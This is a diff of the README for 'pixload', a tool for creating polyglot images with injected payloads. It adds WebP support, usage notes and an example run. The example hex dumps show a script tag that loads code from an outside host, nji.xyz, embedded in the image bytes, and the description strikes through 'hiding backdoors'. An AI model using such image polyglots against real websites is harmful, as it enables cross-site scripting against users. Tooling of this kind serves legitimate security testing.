@@ -2,7 +2,9 @@
 
 ## DESCRIPTION
 
-Set of tools for creating/injecting payload into images.
+Set of tools for ~~hiding backdoors~~ creating/injecting payload into images.
+
+The following image types are currently supported: BMP, GIF, JPG, PNG, WebP.
 
 Useful references for better understanding of `pixload` and its use-cases:
 
@@ -295,6 +297,50 @@ payload.png: PNG image data, 32 x 32, 8-bit/color RGB, non-interlaced
 000000d0  63 3d 2f 2f 6e 6a 69 2e  78 79 7a 3e 3c 2f 73 63  |c=//nji.xyz></sc|
 000000e0  72 69 70 74 3e 9d 11 54  97 00 49 45 4e 44        |ript>..T..IEND|
 000000ee
+```
+
+### webp.pl
+
+WebP Payload Creator/Injector.
+
+Create a WebP Polyglot Image with custom/default payload, or inject
+payload into existing image.
+
+##### Usage
+
+```sh
+./webp.pl [-payload 'STRING'] -output payload.webp
+
+Currently, there is no possibility to inject the payload into an existing
+webp image.  Only the new (minimal) webp image will be created and your
+payload will be injected into.
+
+If the -output argument file exists, the payload will be injected into 
+the existing image, but this image will be corrupted.
+```
+
+##### Example
+
+```sh
+[>|      WebP Payload Creator/Injector       |<]
+
+    https://github.com/chinarulezzz/pixload
+
+
+[>] Generating output file
+[✔] File saved to: payload.webp
+
+[>] Injecting payload into payload.webp
+[✔] Payload was injected successfully
+
+payload.webp: RIFF (little-endian) data, Web/P image
+
+00000000  52 49 46 46 2f 2a 00 00  57 45 42 50 56 50 38 4c  |RIFF/*..WEBPVP8L|
+00000010  ff ff ff 00 2f 00 00 00  10 07 10 11 11 88 88 fe  |..../...........|
+00000020  07 00 2a 2f 3d 31 3b 3c  73 63 72 69 70 74 20 73  |..*/=1;<script s|
+00000030  72 63 3d 2f 2f 6e 6a 69  2e 78 79 7a 3e 3c 2f 73  |rc=//nji.xyz></s|
+00000040  63 72 69 70 74 3e 3b                              |cript>;|
+00000047
 ```
 
 ## LICENSE
